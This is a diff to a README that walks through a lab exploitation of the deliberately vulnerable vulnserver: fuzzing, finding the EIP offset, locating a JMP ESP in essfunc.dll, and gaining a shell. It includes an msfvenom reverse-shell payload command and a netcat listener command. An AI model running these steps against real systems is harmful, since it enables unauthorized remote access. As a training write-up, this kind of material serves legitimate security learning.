@@ -23,8 +23,8 @@ This setup shows how a vulnerable server running on a Windows machine is exploit
 ## Step 1: Starting vulnserver with Immunity Debugger
 
 I started off by running the `vulnserver.exe` file on the Windows machine. Then I opened up Immunity Debugger, attached it to `vulnserver.exe`, and hit the play button (F9) to get it running. Now the debugger was all set and waiting to catch any crashes when the exploit hits.
-![VulnServer](poc/step1a.png)
-![Immunity Debugger](poc/step1b.png)
+- ![VulnServer](poc/step1a.png)
+- ![Immunity Debugger](poc/step1b.png)
 
 ## Step 2: Connecting to the Vulnerable Server
 
@@ -35,10 +35,13 @@ After setting everything up, I opened a terminal on the Parrot machine and conne
 - Spike templates define how packets are sent to the server. They're used to find vulnerable functions.
 - Opened a terminal and ran `pluma trun.spk` to create the spike file.
 - Wrote the following inside the file: `s_readline();`, `s_string("TRUN ");`, and `s_string_variable("0");`.
+- ![Trun](poc/step3a.png)
 - Saved the file using `Ctrl+S` and closed the editor.
 - Ran `generic_send_tcp <IP> 9999 trun.spk 0 0` to send spike data to the server.
+- ![Terminal](poc/step3b.png)
 - `<IP>` is the target system, `9999` is the port, and `0 0` are spike parameters.
 - Switched to Immunity Debugger and saw the process had paused.
+- ![Pause](poc/step3.png)
 - EAX, ESP, EBP, and EIP registers were overwritten with "A".
 - This confirmed the TRUN function has a buffer overflow issue.
 - Pressed `Ctrl+Z` on Parrot to stop the running spike command.
@@ -49,8 +52,10 @@ After setting everything up, I opened a terminal on the Parrot machine and conne
 - Relaunched both `vulnserver.exe` and Immunity Debugger as admin. Attached the process again and hit Run in the toolbar.
 - Used a Python script called `fuzz.py` to send increasing amounts of data to the TRUN command.
 - The script multiplies the buffer in each loop and sends it over TCP. This gradually pushes the server toward a crash.
+- ![Fuzz](poc/step4a.png)
 - While the script runs, the terminal shows connection attempts from the attacking machine.
 - In Immunity Debugger, the process status eventually changed from Running to Paused.
+- ![Bugger](poc/step4b.png)
 - But even after the crash, the EIP register wasn’t overwritten by the script.
 - Went back to the terminal on Parrot and hit `Ctrl+C` to stop the script.
 - The crash happened after around 10200 bytes of input. Still, EIP stayed untouched.
@@ -62,20 +67,26 @@ After setting everything up, I opened a terminal on the Parrot machine and conne
 - Opened a new terminal in root.
 - Ran `cd` to move to the root directory. This made it easy to access Metasploit tools.
 - Executed the command `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 10400`. It generated a unique 10400-byte pattern.
+- ![Pattern](poc/step5a.png)
 - Copied the output from the terminal using right-click → Copy. Then closed the terminal.
 - Switched to the previous terminal and created a Python file called `findoff.py`. Replaced the offset variable's content with the copied pattern and saved it.
+- ![Findoff](poc/step5b.png)
 - Ran `findoff.py`, which sent the pattern to the server. This caused a buffer overflow and random bytes were placed into EIP.
 - Checked Immunity Debugger and noted the EIP value that got overwritten. That value was used to calculate the offset.
+- ![EIP](poc/step5c.png)
 - Opened a new terminal again and typed `sudo su` to become root. Moved back to the root directory with `cd`.
 - Ran the command `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10400 -q 386F4337`. This found the position of the random EIP value inside the pattern.
 - The flag `-l` is for length (10400 bytes), and `-q` is the EIP value from Immunity. The result showed that the offset to reach EIP was exactly 2003 bytes.
+- ![Value](poc/step5d.png)
 - Closed everything and re-launched both `vulnserver.exe` and Immunity Debugger as admin. Re-attached the process and hit Run to prep for the next step.
 
 ## Step 6: Overwriting the EIP Register
 
 - Created a Python script named `overwrite.py` to test EIP control. This script sends a payload that hits exactly at the EIP offset.
+- ![Overwrite](poc/step6a.png)
 - Ran the script in the terminal. Then switched over to the Windows 11 machine to check Immunity Debugger.
 - Saw that the EIP register was successfully overwritten.
+- ![Reg](poc/step6b.png)
 - This confirmed that the EIP register can be controlled. Shellcode can be injected at this point in future steps.
 - Closed the vulnerable server and Immunity Debugger again. Relaunched both as admin and reattached the process.
 
@@ -83,9 +94,13 @@ After setting everything up, I opened a terminal on the Parrot machine and conne
 
 - Before adding shellcode, it's important to check for bad characters. These can break or stop the shellcode from working properly.
 - Created a Python script named `badchars.py` and ran it from the Parrot terminal. Then switched to the Windows 11 machine.
+- ![Bad](poc/step7a.png)
+- ![Char](poc/step7b.png)
 - In Immunity Debugger, clicked on the ESP register value from the top-right. Right-clicked it and selected "Follow in Dump".
+- ![Dump](poc/step7c.png)
 - The lower-left window showed the byte dump starting from ESP. Scrolled through it and checked for missing or corrupt characters.
 - Observed that there were no bad characters in the output. This meant the shellcode can be injected safely without byte conflicts.
+- ![Result](poc/step7d.png)
 - Closed both the vulnerable server and Immunity Debugger again. Relaunched them as admin and reattached the process.
 
 ## Step 8: Finding a Module Without Memory Protection
@@ -95,6 +110,7 @@ After setting everything up, I opened a terminal on the Parrot machine and conne
 - Switched to Immunity Debugger and used the bottom text field to run the command `!mona modules`.
 - A log window popped up showing details of different modules. It listed protection flags like ASLR, DEP, and SafeSEH.
 - Noticed that the module `essfunc.dll` had no memory protection enabled. This made it a good candidate for EIP redirection.
+- ![Mona](poc/step8.png)
 - Decided to use `essfunc.dll` to exploit the vulnerability. This module will be used to inject shellcode and take control of EIP.
 
 ## Step 9: Getting JMP ESP Address from essfunc.dll
@@ -102,20 +118,25 @@ After setting everything up, I opened a terminal on the Parrot machine and conne
 - The goal now is to use `essfunc.dll` to take control of EIP. This involves finding a `JMP ESP` instruction in the module.
 - Switched to the Host machine and opened a new terminal. Gained root access using `sudo su` and changed directory with `cd`.
 - Created and ran a script named `converter.py`. It takes assembly instructions as input and gives hex output.
+- ![Converter](poc/step9a.png)
 - When the prompt `Enter the assembly code here:` appeared, typed `JMP ESP` and pressed Enter.
 - The script returned `ffe4` as the hex value for `JMP ESP`. Noted it down and closed the terminal.
 - Switched to the Windows 11 machine and opened Immunity Debugger. In the command field at the bottom, typed `!mona find -s "\xff\xe4" -m essfunc.dll`.
 - The output showed a valid return address for `JMP ESP` inside `essfunc.dll`. This address will be used to overwrite EIP.
+- ![JMP](poc/step9b.png)
 - Closed both Immunity Debugger and vulnserver. Relaunched and reattached the process again as admin.
 
 ## Step 10: Verifying Control Over EIP Using Return Address
 
 - In Immunity Debugger, clicked the "Go to address in Disassembler" icon. A pop-up appeared asking for the target address.
 - Entered the return address found earlier (e.g., `625011af`) and clicked OK. It jumped to the instruction at that address.
+- ![Address](poc/step10a.png)
 - Pressed `F2` to set a breakpoint at the selected `JMP ESP` instruction. This sets up a trigger to catch the redirection.
 - Clicked the Run icon in the toolbar to continue execution. Immunity Debugger started running again.
 - Switched to the Parrot Security machine. Executed the Python script `jump.py` from the terminal.
+- ![Jump](poc/step10b.png)
 - Back in Immunity, observed that EIP was overwritten with the return address. This confirmed the redirection worked as expected.
+- ![Redirect](poc/step10c.png)
 - The ability to control EIP depends on using modules without memory protection. In this case, `essfunc.dll` allowed that.
 - Closed both Immunity Debugger and the vulnerable server. Relaunched `vulnserver.exe` again as administrator for the next step.
 
@@ -125,9 +146,10 @@ After setting everything up, I opened a terminal on the Parrot machine and conne
 - Ran the following command to generate reverse shell payload: `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`.
 - The shellcode was generated in C format. Selected the code, right-clicked, and copied it.
 - Closed the terminal and switched back to the previous one. Created a new script named `shellcode.py`.
+- ![Shellcode](poc/step11a.png)
 - Replaced the buffer section (Line 4) with the copied shellcode. Added `b` before each string to convert them into bytes.
 - Before running the script, opened another terminal and typed `nc -nvlp 4444`. This started Netcat to listen for incoming reverse shell.
+- ![Netcat](poc/step11b.png)
 - Then executed the `shellcode.py` script from the terminal. Switched back to the Netcat terminal to monitor incoming connection.
 - Saw that shell access to the target vulnerable Windows server was successfully established. The reverse shell was now active.
-
-
+- ![Access](poc/step11c.png)
